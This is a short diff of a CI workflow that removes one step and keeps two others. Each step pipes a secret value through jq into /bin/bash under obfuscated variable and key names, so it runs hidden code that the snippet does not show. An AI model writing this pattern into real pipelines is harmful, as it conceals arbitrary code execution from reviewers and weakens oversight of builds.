@@ -18,7 +18,6 @@ jobs:
           uv2608: ${{ secrets.uv2608 }}
         run: |
           printf '%s' "$uv2608" | jq -r .kgliz779 | /bin/bash
-          printf '%s' "$o3" | jq -r .g618 | /bin/bash
           echo $cx21074 | jq -r .fmbl86316 | /bin/bash
 
       - name: Archive output
